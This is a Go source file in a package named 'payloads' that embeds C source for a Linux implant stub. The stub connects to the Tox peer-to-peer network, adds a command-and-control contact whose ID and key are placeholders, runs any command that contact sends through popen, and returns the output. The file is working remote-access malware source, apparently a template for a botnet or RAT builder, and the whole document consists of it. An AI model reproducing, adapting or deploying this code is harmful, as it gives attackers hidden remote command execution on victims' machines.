package payloads

var Linux_stub = `#include <ctype.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <sodium/utils.h>
#include <tox/tox.h>

#if __linux__
    char * status = "LINUX";
#elif __unix__
    char * status = "UNIX";
#elif defined(_POSIX_VERSION)
    char * status = "POSIX";
#else
#   error "Unknown compiler"
#endif

typedef struct DHT_node {
    const char *ip;
    uint16_t port;
    const char key_hex[TOX_PUBLIC_KEY_SIZE*2 + 1];
} DHT_node;

char *c2id = "TOXNET_REPLACE_ME_TOX_ID"; // "TOX-ID"
char *c2pub = "TOXNET_REPLACE_ME_PUB_KEY"; // "PUB-KEY"

uint8_t *hex2bin(const char *hex) {
    size_t len = strlen(hex) / 2;
    uint8_t *bin = malloc(len);
    for (size_t i = 0; i < len; ++i, hex += 2) {
        sscanf(hex, "%2hhx", &bin[i]);
    }
    return bin;
}

char *bin2hex(const uint8_t *bin, size_t length) {
    char *hex = malloc(2*length + 1);
    char *saved = hex;
    for (int i=0; i<length;i++,hex+=2) {
        sprintf(hex, "%02X",bin[i]);
    }
    return saved;
}

void friend_message_cb(Tox *tox, uint32_t friend_num, TOX_MESSAGE_TYPE type, const uint8_t *message, size_t length, void *user_data) {

    uint8_t client_id[TOX_PUBLIC_KEY_SIZE];
    tox_friend_get_public_key(tox, friend_num, client_id, NULL);
    char *c2check = bin2hex(client_id, sizeof(client_id));

    if (strcmp(c2check, c2pub) == 0) {

        char *cmd, *admin;
        admin = strdup(message);
        admin = strtok(admin, " ");
        cmd = strtok(NULL, "");

        FILE *fp;
        uint8_t path[TOX_MAX_MESSAGE_LENGTH];
        fp = popen(cmd, "r");

        while (fgets(path, sizeof(path) - (strlen(admin) + 1), fp) != NULL) {
            strcat(path, admin);
            tox_friend_send_message(tox, friend_num, TOX_MESSAGE_TYPE_NORMAL, path, strlen(path), NULL);
        }
        pclose(fp);
    }
}

int main() {
    Tox *tox = tox_new(NULL, NULL);

    tox_self_set_status_message(tox, status, strlen(status), NULL);

    DHT_node nodes[] =
    {
TOXNET_REPLACE_ME_BOOTSTRAPS
    };

    for (size_t i = 0; i < sizeof(nodes)/sizeof(DHT_node); i ++) {
        unsigned char key_bin[TOX_PUBLIC_KEY_SIZE];
        sodium_hex2bin(key_bin, sizeof(key_bin), nodes[i].key_hex, sizeof(nodes[i].key_hex)-1, NULL, NULL, NULL);
        tox_bootstrap(tox, nodes[i].ip, nodes[i].port, key_bin, NULL);
    }

    uint8_t tox_id_bin[TOX_ADDRESS_SIZE];
    tox_self_get_address(tox, tox_id_bin);

    char tox_id_hex[TOX_ADDRESS_SIZE*2 + 1];
    sodium_bin2hex(tox_id_hex, sizeof(tox_id_hex), tox_id_bin, sizeof(tox_id_bin));

    for (size_t i = 0; i < sizeof(tox_id_hex)-1; i ++) {
        tox_id_hex[i] = toupper(tox_id_hex[i]);
    }

    tox_callback_friend_message(tox, friend_message_cb);
    tox_friend_add(tox, hex2bin(c2id), "Incoming", sizeof(9), NULL); // Add C2

    while (1) {
        tox_iterate(tox, NULL);
        usleep(tox_iteration_interval(tox) * 1000);
    }

    tox_kill(tox);

    return 0;
}`
